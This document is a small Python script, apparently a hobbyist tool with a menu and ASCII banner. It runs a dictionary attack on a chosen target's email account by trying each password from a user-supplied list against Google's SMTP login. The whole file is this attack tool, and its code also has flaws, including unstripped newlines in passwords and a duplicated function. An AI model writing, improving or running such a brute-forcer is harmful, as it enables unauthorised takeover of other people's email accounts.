import smtplib
import colorama
from colorama import init, Fore, Back
from os import system
def out_red(text):
    print("\033[31m {}" .format(text))
def out_green(text):
    print("\033[32m {}" .format(text))
banner = """
       _____                   _
      / ____|            ____ | |
     | (___  _ __ ___   / __ \| | ___
      \___ \| '_ ` _ \ / / _` | |/ _ \
      
      ____) | | | | | | | (_| | |  __/
     |_____/|_| |_| |_|\ \__,_|_|\___|
                        \____/
"""
out_green(banner)
init()
def out_green(text):
    print("\033[32m {}" .format(text))
out_red ('1. Start')
out_red ('2. Exit')

option = input('> ')
if option == '1':
   passlist = input('Enter password_list: ')
if option == '2':
   exit()
pass_found = open(passlist, 'r')
user_name = input('Target email: ')
server = smtplib.SMTP('smtp.googlemail.com',587)
server.ehlo()
server.starttls()
for password in pass_found:
    try:
        server.login(user_name, password)
        print(Fore.GREEN + '[+] Password Found: ' + password)
        break;
    except smtplib.SMTPAuthenticationError:
       print(Fore.RED + '[-] Password not founded')
input()
